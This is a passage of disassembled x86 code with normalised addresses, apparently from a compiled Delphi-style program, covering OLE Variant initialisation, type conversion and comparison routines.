lea eax [ ebp - 0x50 ]
call sub_437298
mov edx [ ebp - 0x50 ]
mov eax esi
call sub_449d2c
jmp r-xdata
mov eax [ ebx + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x54 ]
call sub_442404
mov edx [ ebp - 0x54 ]
mov eax esi
call sub_449f7c
jmp r-xdata
mov eax [ ebx + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x58 ]
call sub_44243c
mov edx [ ebp - 0x58 ]
mov eax esi
call sub_449f7c
jmp r-xdata
mov eax esi
mov edx [ ebx + 0x8 ]
mov edx [ edx ]
call sub_449ed8
jmp r-xdata
lea edx [ ebp - 0x5c ]
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
call sub_442474
mov edx [ ebp - 0x5c ]
mov eax esi
call sub_449f7c
jmp r-xdata
lea edx [ ebp - 0x60 ]
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
call sub_435628
mov edx [ ebp - 0x60 ]
mov eax esi
call sub_449d2c
jmp r-xdata
lea edx [ ebp - 0x64 ]
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
call sub_435628
mov edx [ ebp - 0x64 ]
mov eax esi
call sub_449d2c
jmp r-xdata
lea edx [ ebp - 0x68 ]
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
call sub_435628
mov edx [ ebp - 0x68 ]
mov eax esi
call sub_449d2c
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
xor edx edx
push edx
push eax
lea eax [ ebp - 0x6c ]
call sub_435834
mov edx [ ebp - 0x6c ]
mov eax esi
call sub_449d2c
jmp r-xdata
mov eax [ ebx + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x70 ]
call sub_435834
mov edx [ ebp - 0x70 ]
mov eax esi
call sub_449d2c
jmp r-xdata
mov eax [ ebx + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x74 ]
call sub_435648
mov edx [ ebp - 0x74 ]
mov eax esi
call sub_449d2c
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx eax
mov eax esi
call sub_443610
jmp r-xdata
sub_443bc8
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov esi edx
mov ebx eax
lea eax [ ebp - 0x10 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_443c32
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx esi
lea eax [ ebp - 0x10 ]
call sub_43f250
lea eax [ ebp - 0x10 ]
call [ rw-data ]
cmp [ ebp - 0x10 ] 0xd
je r-xdata
mov eax ebx
mov edx [ ebp - 0x8 ]
call sub_44b8f0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_443c39
lea eax [ ebp - 0x10 ]
call sub_43ef08
retn
mov dx 0xd
mov ax 0x101
call sub_43e6b8
sub_443c40
push ebx
push esi
push ecx
mov ebx edx
mov esi eax
movzx eax [ ebx ]
cmp eax 0xd
jg r-xdata
sub eax 0x101
je r-xdata
je r-xdata
mov edx ebx
mov eax esi
call sub_443bc8
jmp r-xdata
sub eax 0x3f08
je r-xdata
mov eax esi
mov edx [ ebx + 0x8 ]
call sub_44b8f0
jmp r-xdata
sub eax 0x1
jb r-xdata
pop edx
pop esi
pop ebx
retn
mov eax esi
mov edx [ ebx + 0x8 ]
mov edx [ edx ]
call sub_44b8f0
jmp r-xdata
sub eax 0x4
je r-xdata
mov eax esi
call sub_44b8d8
jmp r-xdata
je r-xdata
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
sub eax 0x8
je r-xdata
mov edx esp
movzx eax [ ebx ]
call sub_44534c
test al al
je r-xdata
mov eax esi
call sub_44b8d8
jmp r-xdata
mov dx 0xd
mov ax 0x1
call sub_43e6b8
jmp r-xdata
movzx eax [ ebx ]
mov dx 0xd
call sub_43e6b8
mov eax esi
call sub_44b8d8
mov ecx eax
mov edx r-xdata
mov eax [ esp ]
call sub_448278
test al al
jne r-xdata
sub_443d0c
push ebx
push esi
push ecx
mov ebx edx
mov esi eax
movzx eax [ ebx ]
sub ax 0x1
jb r-xdata
mov eax esi
call sub_44b8d8
jmp r-xdata
je r-xdata
pop edx
pop esi
pop ebx
retn
cmp [ rw-data ] 0x0
je r-xdata
sub ax 0x8
je r-xdata
mov eax esi
call sub_44b8d8
jmp r-xdata
mov dx 0x9
mov ax 0x1
call sub_43e6b8
mov eax esi
mov edx [ ebx + 0x8 ]
call sub_44b8f0
jmp r-xdata
sub ax 0x4000
je r-xdata
mov eax esi
mov edx [ ebx + 0x8 ]
mov edx [ edx ]
call sub_44b8f0
jmp r-xdata
jmp r-xdata
mov edx esp
movzx eax [ ebx ]
call sub_44534c
test al al
je r-xdata
movzx eax [ ebx ]
mov dx 0x9
call sub_43e6b8
mov eax esi
call sub_44b8d8
mov ecx eax
mov edx r-xdata
mov eax [ esp ]
call sub_448278
test al al
jne r-xdata
sub_443db8
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
test [ edi ] 0xbfe8
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax edi
call sub_43ee74
mov [ edi ] 0x3
movsx eax bl
movzx eax [ eax * 2 + rw-data ]
mov [ edi ] ax
jmp r-xdata
mov [ edi + 0x8 ] esi
pop edi
pop esi
pop ebx
retn
sub_443df4
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov [ ebx ] 0x3
mov [ ebx + 0x8 ] esi
pop esi
pop ebx
retn
mov eax ebx
call sub_43ee74
sub_443e14
push ebx
push esi
mov ebx edx
mov esi eax
test [ esi ] 0xbfe8
je r-xdata
mov [ esi ] 0x11
mov [ esi + 0x8 ] bl
pop esi
pop ebx
retn
mov eax esi
call sub_43ee74
sub_443e34
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov [ ebx ] 0x12
mov [ ebx + 0x8 ] si
pop esi
pop ebx
retn
mov eax ebx
call sub_43ee74
sub_443e54
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov [ ebx ] 0x13
mov [ ebx + 0x8 ] esi
pop esi
pop ebx
retn
mov eax ebx
call sub_43ee74
sub_443e74
push ebp
mov ebp esp
push ebx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov [ ebx ] 0x15
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x8 ] eax
mov eax [ ebp + 0xc ]
mov [ ebx + 0xc ] eax
pop ebx
pop ebp
retn 0x8
mov eax ebx
call sub_43ee74
sub_443ea0
push ebx
push esi
mov ebx edx
mov esi eax
test [ esi ] 0xbfe8
je r-xdata
mov [ esi ] 0x10
mov [ esi + 0x8 ] bl
pop esi
pop ebx
retn
mov eax esi
call sub_43ee74
sub_443ec0
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov [ ebx ] 0x2
mov [ ebx + 0x8 ] si
pop esi
pop ebx
retn
mov eax ebx
call sub_43ee74
sub_443ee0
push ebp
mov ebp esp
push ebx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov [ ebx ] 0x14
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x8 ] eax
mov eax [ ebp + 0xc ]
mov [ ebx + 0xc ] eax
pop ebx
pop ebp
retn 0x8
mov eax ebx
call sub_43ee74
sub_443f0c
push ebp
mov ebp esp
push ebx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x8 ] eax
mov [ ebx ] 0x4
pop ebx
pop ebp
retn 0x4
mov eax ebx
call sub_43ee74
sub_443f30
push ebp
mov ebp esp
push ebx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x8 ] eax
mov eax [ ebp + 0xc ]
mov [ ebx + 0xc ] eax
mov [ ebx ] 0x5
pop ebx
pop ebp
retn 0x8
mov eax ebx
call sub_43ee74
sub_443f5c
push ebp
mov ebp esp
push ebx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x8 ] eax
mov eax [ ebp + 0xc ]
mov [ ebx + 0xc ] eax
mov [ ebx ] 0x6
pop ebx
pop ebp
retn 0x8
mov eax ebx
call sub_43ee74
sub_443f88
push ebp
mov ebp esp
push ebx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x8 ] eax
mov eax [ ebp + 0xc ]
mov [ ebx + 0xc ] eax
mov [ ebx ] 0x7
pop ebx
pop ebp
retn 0x8
mov eax ebx
call sub_43ee74
sub_443fb4
push ebx
push esi
mov ebx edx
mov esi eax
test [ esi ] 0xbfe8
je r-xdata
mov [ esi ] 0xb
cmp bl 0x1
cmc
sbb eax eax
mov [ esi + 0x8 ] ax
pop esi
pop ebx
retn
mov eax esi
call sub_43ee74
sub_444018
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
xor eax eax
mov [ ebx + 0x8 ] eax
mov [ ebx ] 0x100
lea eax [ ebx + 0x8 ]
mov edx esi
call sub_44939c
pop esi
pop ebx
retn
mov eax ebx
call sub_43ee74
sub_444044
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
xor eax eax
mov [ ebx + 0x8 ] eax
mov [ ebx ] 0x8
lea eax [ ebx + 0x8 ]
push eax
mov ecx 0x7fffffff
mov edx 0x1
mov eax esi
call sub_449c74
pop esi
pop ebx
retn
mov eax ebx
call sub_43ee74
sub_44407c
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
xor eax eax
mov [ ebx + 0x8 ] eax
mov [ ebx ] 0x102
lea eax [ ebx + 0x8 ]
mov edx esi
call sub_449d2c
pop esi
pop ebx
retn
mov eax ebx
call sub_43ee74
sub_4440a8
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
xor eax eax
mov [ ebx + 0x8 ] eax
mov [ ebx ] 0xd
lea eax [ ebx + 0x8 ]
mov edx esi
call sub_44b8f0
pop esi
pop ebx
retn
mov eax ebx
call sub_43ee74
sub_4440d4
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
xor eax eax
mov [ ebx + 0x8 ] eax
mov [ ebx ] 0x9
lea eax [ ebx + 0x8 ]
mov edx esi
call sub_44b8f0
pop esi
pop ebx
retn
mov eax ebx
call sub_43ee74
sub_444100
push ebx
mov ebx eax
and bx 0xfff
cmp bx 0x15
jbe r-xdata
mov eax ebx
pop ebx
retn
cmp bx 0x100
je r-xdata
mov bx 0x8
jmp r-xdata
cmp bx 0x102
jne r-xdata
call sub_43e754
sub_44412c
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
mov edi ecx
mov ebx edx
mov esi eax
lea eax [ ebp - 0x11 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_4441ef
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx esi
lea eax [ ebp - 0x11 ]
call sub_43f250
cmp [ esi ] 0x101
jne r-xdata
cmp [ ebx ] 0x101
jne r-xdata
lea eax [ ebp - 0x11 ]
call [ rw-data ]
mov edx ebx
lea eax [ ebp - 0x11 ]
mov ecx edi
call sub_444a54
mov [ ebp - 0x1 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4441f6
lea eax [ ebp - 0x11 ]
call sub_43ef08
retn
lea eax [ ebp - 0x21 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_4441c3
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x21 ]
call sub_43f250
lea eax [ ebp - 0x21 ]
call [ rw-data ]
lea edx [ ebp - 0x21 ]
lea eax [ ebp - 0x11 ]
mov ecx edi
call sub_444a54
mov [ ebp - 0x1 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x21 ]
call sub_43ef08
retn
sub_444218
push ebx
push ecx
mov [ esp ] dl
mov bl 0x1
mov edx ecx
sub edx 0xe
je r-xdata
movzx edx [ rw-data ]
sub dl 0x1
jb r-xdata
dec edx
je r-xdata
call sub_43e7a8
jmp r-xdata
je r-xdata
movzx edx [ rw-data ]
sub dl 0x1
jb r-xdata
dec edx
sub edx 0x4
jb r-xdata
mov eax ebx
pop edx
pop ebx
retn
movzx ebx [ rw-data ]
jmp r-xdata
dec dl
je r-xdata
call sub_43e7a8
jmp r-xdata
je r-xdata
movzx edx [ rw-data ]
sub dl 0x1
jb r-xdata
jmp r-xdata
cmp al 0x2
jne r-xdata
jmp r-xdata
movzx ebx [ rw-data ]
jmp r-xdata
dec dl
je r-xdata
call sub_43e7a8
jmp r-xdata
je r-xdata
call sub_43e754
xor eax eax
jmp r-xdata
cmp [ esp ] 0x2
je r-xdata
cmp al 0x2
jne r-xdata
jmp r-xdata
movzx ebx [ ecx * 2 + rw-data ]
jmp r-xdata
dec dl
je r-xdata
and eax 0x7f
movzx ebx [ eax + rw-data ]
jmp r-xdata
mov al 0x1
mov al 0x1
cmp [ esp ] 0x2
jne r-xdata
cmp al 0x2
jne r-xdata
jmp r-xdata
xor eax eax
jmp r-xdata
mov bl 0x2
jmp r-xdata
cmp [ esp ] 0x2
jne r-xdata
and eax 0x7f
movzx ebx [ eax + rw-data ]
jmp r-xdata
xor ebx ebx
jmp r-xdata
mov bl 0x1
jmp r-xdata
sub_444320
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
mov edx [ ebp + 0x14 ]
cmp edx [ ebp + 0xc ]
jne r-xdata
jge r-xdata
cmp eax [ ebp + 0x8 ]
jae r-xdata
mov eax [ ebp + 0x10 ]
mov edx [ ebp + 0x14 ]
cmp edx [ ebp + 0xc ]
jne r-xdata
xor eax eax
jmp r-xdata
jmp r-xdata
jle r-xdata
cmp eax [ ebp + 0x8 ]
jbe r-xdata
pop ebp
retn 0x10
mov al 0x1
mov al 0x2
jmp r-xdata
jmp r-xdata
sub_44435c
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
mov edx [ ebp + 0x14 ]
cmp edx [ ebp + 0xc ]
jne r-xdata
jae r-xdata
cmp eax [ ebp + 0x8 ]
mov eax [ ebp + 0x10 ]
mov edx [ ebp + 0x14 ]
cmp edx [ ebp + 0xc ]
jne r-xdata
xor eax eax
jmp r-xdata
jbe r-xdata
cmp eax [ ebp + 0x8 ]
pop ebp
retn 0x10
mov al 0x1
mov al 0x2
jmp r-xdata
sub_444390
push ebp
mov ebp esp
fld [ ebp + 0x10 ]
fcomp [ ebp + 0x8 ]
fwait
fnstsw ax
sahf
jae r-xdata
fld [ ebp + 0x10 ]
fcomp [ ebp + 0x8 ]
fwait
fnstsw ax
sahf
jbe r-xdata
xor eax eax
jmp r-xdata
mov al 0x1
mov al 0x2
jmp r-xdata
pop ebp
retn 0x10
sub_4443bc
push ebp
mov ebp esp
fld [ ebp + 0x10 ]
fcomp [ ebp + 0x8 ]
fwait
fnstsw ax
sahf
jae r-xdata
fld [ ebp + 0x10 ]
fcomp [ ebp + 0x8 ]
fwait
fnstsw ax
sahf
jbe r-xdata
xor eax eax
jmp r-xdata
mov al 0x1
mov al 0x2
jmp r-xdata
pop ebp
retn 0x10
sub_4443e8
push ebp
mov ebp esp
fild [ ebp + 0x10 ]
fild [ ebp + 0x8 ]
fcompp
fwait
fnstsw ax
sahf
jbe r-xdata
fild [ ebp + 0x10 ]
fild [ ebp + 0x8 ]
fcompp
fwait
fnstsw ax
sahf
jae r-xdata
xor eax eax
jmp r-xdata
mov al 0x1
mov al 0x2
jmp r-xdata
pop ebp
retn 0x10
sub_444418
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
mov ebx edx
xor edx edx
push ebp
push sub_444473
push [ fs : edx ]
mov [ fs : edx ] esp
mov edx eax
lea eax [ ebp - 0x4 ]
call sub_443610
mov edx ebx
lea eax [ ebp - 0x8 ]
call sub_443610
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_434db8
xor edx edx
call sub_44430c
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44447a
lea eax [ ebp - 0x8 ]
mov edx 0x2
call j_sub_44936c
retn
sub_444484
push ebx
push esi
push edi
push ebp
mov ebp ecx
mov edi edx
mov esi eax
movzx eax [ esi ]
call sub_444100
movzx eax ax
movzx ebx [ eax + rw-data ]
movzx eax [ edi ]
call sub_444100
movzx eax ax
movzx eax [ eax + rw-data ]
movzx edx al
movzx ecx bl
lea ecx [ ecx + ecx * 2 ]
lea ecx [ ecx * 4 + rw-data ]
movzx edx [ ecx + edx ]
cmp edx 0xb
ja r-xdata
call sub_43e754
mov al 0x1
jmp [ edx * 4 + jump_table_4444d6 ]
call sub_43e754
mov al 0x1
jmp r-xdata
mov edx eax
mov eax ebx
call sub_444204
jmp r-xdata
mov ecx ebp
mov edx eax
mov eax ebx
call sub_444218
jmp r-xdata
mov eax edi
call sub_43f954
push eax
mov eax esi
call sub_43f954
pop edx
call sub_44430c
jmp r-xdata
mov eax esi
call sub_440484
push edx
push eax
mov eax edi
call sub_440484
push edx
push eax
call sub_444320
jmp r-xdata
mov eax esi
call sub_440914
push edx
push eax
mov eax edi
call sub_440914
push edx
push eax
call sub_44435c
jmp r-xdata
mov eax esi
call sub_441194
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax edi
call sub_441194
add esp 0xfffffff8
fstp [ esp ]
fwait
call sub_444390
jmp r-xdata
mov eax esi
call sub_4419ac
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax edi
call sub_4419ac
add esp 0xfffffff8
fstp [ esp ]
fwait
call sub_4443bc
jmp r-xdata
mov eax esi
call sub_441fa8
add esp 0xfffffff8
fistp [ esp ]
fwait
mov eax edi
call sub_441fa8
add esp 0xfffffff8
fistp [ esp ]
fwait
call sub_4443e8
jmp r-xdata
mov edx edi
mov eax esi
call sub_444418
jmp r-xdata
mov eax edi
call sub_440c2c
and eax 0x7f
push eax
mov eax esi
call sub_440c2c
and eax 0x7f
pop edx
call sub_44430c
jmp r-xdata
mov edx edi
mov eax esi
mov ecx ebp
call sub_44412c
jmp r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
sub_444630
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov [ ebp - 0x9 ] 0x1
movzx esi [ ebx ]
mov eax esi
and ax 0xfff
cmp ax 0x10f
jae r-xdata
mov eax [ ebp - 0x4 ]
movzx eax [ eax ]
test ax ax
jne r-xdata
test si si
jne r-xdata
mov edx [ ebp - 0x4 ]
cmp ax 0x1
jne r-xdata
mov dl 0x1
xor eax eax
call sub_444204
mov [ ebp - 0x9 ] al
jmp r-xdata
cmp si 0x1
jne r-xdata
xor edx edx
mov al 0x1
call sub_444204
mov [ ebp - 0x9 ] al
jmp r-xdata
lea edx [ ebp - 0x14 ]
mov eax esi
call sub_44534c
test al al
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov dl 0x2
xor eax eax
call sub_444218
mov [ ebp - 0x9 ] al
jmp r-xdata
movzx eax [ ebp - 0x9 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
movzx eax [ eax ]
call sub_44534c
test al al
jne r-xdata
mov ecx [ ebp - 0x8 ]
xor edx edx
mov al 0x2
call sub_444218
mov [ ebp - 0x9 ] al
jmp r-xdata
lea eax [ ebp - 0xe ]
push eax
mov edx [ ebp - 0x4 ]
mov ecx 0xb
mov eax [ ebp - 0x14 ]
mov esi [ eax ]
call [ esi + 0x8 ]
test al al
je r-xdata
call sub_43e754
jmp r-xdata
lea eax [ ebp - 0xc ]
push eax
mov edx ebx
mov ecx 0xb
mov eax [ ebp - 0x18 ]
mov esi [ eax ]
call [ esi + 0x4 ]
test al al
je r-xdata
call sub_43e754
jmp r-xdata
mov esi [ ebp - 0x4 ]
movzx esi [ esi ]
mov eax esi
and ax 0xfff
cmp ax 0x10f
jae r-xdata
mov eax [ ebp - 0x4 ]
movzx eax [ eax ]
cmp ax [ ebp - 0xe ]
je r-xdata
lea eax [ ebp - 0x28 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_4447cb
push [ fs : eax ]
mov [ fs : eax ] esp
movzx ecx [ ebx ]
mov edx [ ebp - 0x4 ]
lea eax [ ebp - 0x28 ]
call sub_43f568
movzx eax [ ebp - 0x28 ]
and ax 0xfff
cmp ax [ ebx ]
je r-xdata
movzx eax [ ebx ]
cmp ax [ ebp - 0xc ]
je r-xdata
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
mov eax esi
call sub_44534c
test al al
jne r-xdata
lea eax [ ebp - 0x28 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_44495f
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx [ ebp - 0x4 ]
movzx ecx [ ecx ]
mov edx ebx
lea eax [ ebp - 0x28 ]
call sub_43f568
mov eax [ ebp - 0x4 ]
movzx eax [ eax ]
cmp ax [ ebp - 0x28 ]
je r-xdata
mov eax [ ebp - 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx ebx
mov eax [ ebp - 0x14 ]
mov ebx [ eax ]
call [ ebx + 0x34 ]
and eax 0x7f
mov edx [ ebp - 0x8 ]
lea edx [ edx * 2 + rw-data ]
movzx eax [ edx + eax - 0x1c ]
mov [ ebp - 0x9 ] al
jmp r-xdata
lea eax [ ebp - 0x28 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_4448bc
push [ fs : eax ]
mov [ fs : eax ] esp
movzx ecx [ ebp - 0xe ]
mov edx [ ebp - 0x4 ]
lea eax [ ebp - 0x28 ]
call sub_43f568
movzx eax [ ebp - 0x28 ]
cmp ax [ ebp - 0xe ]
je r-xdata
lea edx [ ebp - 0x28 ]
mov eax ebx
mov ecx [ ebp - 0x8 ]
call sub_444484
mov [ ebp - 0x9 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x28 ]
call sub_43ef08
retn
call sub_43e664
mov eax [ ebp - 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx ebx
mov eax [ ebp - 0x18 ]
mov ebx [ eax ]
call [ ebx + 0x34 ]
and eax 0x7f
mov edx [ ebp - 0x8 ]
lea edx [ edx * 2 + rw-data ]
movzx eax [ edx + eax - 0x1c ]
mov [ ebp - 0x9 ] al
jmp r-xdata
lea eax [ ebp - 0x28 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_44473c
push [ fs : eax ]
mov [ fs : eax ] esp
movzx ecx [ ebp - 0xc ]
mov edx ebx
lea eax [ ebp - 0x28 ]
call sub_43f568
movzx eax [ ebp - 0x28 ]
and ax 0xfff
cmp ax [ ebp - 0xc ]
je r-xdata
lea eax [ ebp - 0xc ]
push eax
mov edx ebx
mov ecx 0xb
mov eax [ ebp - 0x18 ]
mov esi [ eax ]
call [ esi + 0x4 ]
test al al
je r-xdata
call sub_43e754
jmp r-xdata
mov edx [ ebp - 0x4 ]
lea eax [ ebp - 0x28 ]
mov ecx [ ebp - 0x8 ]
call sub_444484
mov [ ebp - 0x9 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x28 ]
call sub_43ef08
retn
call sub_43e664
mov eax [ ebp - 0x8 ]
push eax
lea ecx [ ebp - 0x28 ]
mov edx ebx
mov eax [ ebp - 0x14 ]
mov ebx [ eax ]
call [ ebx + 0x34 ]
and eax 0x7f
mov edx [ ebp - 0x8 ]
lea edx [ edx * 2 + rw-data ]
movzx eax [ edx + eax - 0x1c ]
mov [ ebp - 0x9 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x28 ]
call sub_43ef08
retn
call sub_43e664
mov eax [ ebp - 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x18 ]
mov ebx [ eax ]
call [ ebx + 0x34 ]
and eax 0x7f
mov edx [ ebp - 0x8 ]
lea edx [ edx * 2 + rw-data ]
movzx eax [ edx + eax - 0x1c ]
mov [ ebp - 0x9 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x28 ]
call sub_43ef08
retn
call sub_43e664
call sub_43e754
movzx eax [ ebx ]
cmp ax [ ebp - 0xc ]
je r-xdata
mov eax [ ebp - 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx ebx
mov eax [ ebp - 0x18 ]
mov ebx [ eax ]
call [ ebx + 0x34 ]
and eax 0x7f
mov edx [ ebp - 0x8 ]
lea edx [ edx * 2 + rw-data ]
movzx eax [ edx + eax - 0x1c ]
mov [ ebp - 0x9 ] al
jmp r-xdata
lea eax [ ebp - 0x28 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_444a16
push [ fs : eax ]
mov [ fs : eax ] esp
movzx ecx [ ebp - 0xc ]
mov edx ebx
lea eax [ ebp - 0x28 ]
call sub_43f568
movzx eax [ ebp - 0x28 ]
cmp ax [ ebp - 0xc ]
je r-xdata
mov eax [ ebp - 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x18 ]
mov ebx [ eax ]
call [ ebx + 0x34 ]
and eax 0x7f
mov edx [ ebp - 0x8 ]
lea edx [ edx * 2 + rw-data ]
movzx eax [ edx + eax - 0x1c ]
mov [ ebp - 0x9 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x28 ]
call sub_43ef08
retn
call sub_43e664
sub_444a54
push esi
push edi
movzx esi [ eax ]
movzx edi [ edx ]
cmp si 0x10f
jae r-xdata
cmp si 0x400c
jne r-xdata
cmp di 0x10f
jae r-xdata
cmp di 0x400c
jne r-xdata
mov eax [ eax + 0x8 ]
call sub_444a54
jmp r-xdata
call sub_444484
pop edi
pop esi
retn
and si 0xfff
cmp si 0x10f
jae r-xdata
mov edx [ edx + 0x8 ]
call sub_444a54
jmp r-xdata
pop edi
pop esi
retn
call sub_444630
and di 0xfff
cmp di 0x10f
jae r-xdata
call sub_444484
jmp r-xdata
sub_444d38
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_444e4b
push [ fs : eax ]
mov [ fs : eax ] esp
mov edi ebx
and di 0xfff
cmp di 0x15
ja r-xdata
cmp bx 0x100
jne r-xdata
mov eax esi
movzx edx di
mov edx [ edx * 4 + rw-data ]
call sub_449d2c
jmp r-xdata
cmp bx 0x102
jne r-xdata
mov eax esi
mov edx r-xdata
call sub_449d2c
jmp r-xdata
test bh 0x20
je r-xdata
cmp bx 0x101
jne r-xdata
mov eax esi
mov edx r-xdata
call sub_449d2c
jmp r-xdata
test bh 0x40
je r-xdata
mov ecx [ esi ]
mov eax esi
mov edx r-xdata
call sub_44a0e8
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_44534c
test al al
je r-xdata
mov eax esi
mov edx r-xdata
call sub_449d2c
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_444e52
lea eax [ ebp - 0xc ]
mov edx 0x2
call j_sub_44936c
retn
mov ecx [ esi ]
mov eax esi
mov edx r-xdata
call sub_44a0e8
lea ecx [ ebp - 0xc ]
movzx eax di
mov edx 0x4
call sub_43585c
mov ecx [ ebp - 0xc ]
mov edx [ rw-data ]
mov edx [ edx ]
mov eax esi
call sub_44a0e8
push esi
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
call sub_448088
mov eax [ ebp - 0x8 ]
mov ecx 0x7fffffff
mov edx 0x2
call sub_44a368
jmp r-xdata
sub_444f00
push ebx
push esi
push edi
add esp 0xffffffec
mov ebx eax
mov eax ebx
call sub_444ef0
mov esi eax
lea edi [ esp + 0x4 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movzx ebx [ esp + 0x4 ]
cmp bx 0x10f
jae r-xdata
mov edx esp
mov eax ebx
call sub_44534c
test al al
je r-xdata
cmp [ esp + 0x4 ] 0x0
je r-xdata
xor eax eax
lea edx [ esp + 0x4 ]
mov eax [ esp ]
mov ecx [ eax ]
call [ ecx + 0x14 ]
jmp r-xdata
mov al 0x1
jmp r-xdata
movzx eax [ esp + 0x4 ]
cmp ax 0x9
je r-xdata
add esp 0x14
pop edi
pop esi
pop ebx
retn
cmp [ esp + 0xc ] 0x0
je r-xdata
cmp ax 0xd
jne r-xdata
xor eax eax
jmp r-xdata
sub_444f74
push ebx
push esi
push edi
add esp 0xffffffe0
mov esi edx
mov ebx eax
mov eax ebx
call sub_444ef0
push esi
mov esi eax
lea edi [ esp + 0x4 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov eax esi
call sub_444ef0
push esi
mov esi eax
lea edi [ esp + 0x14 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
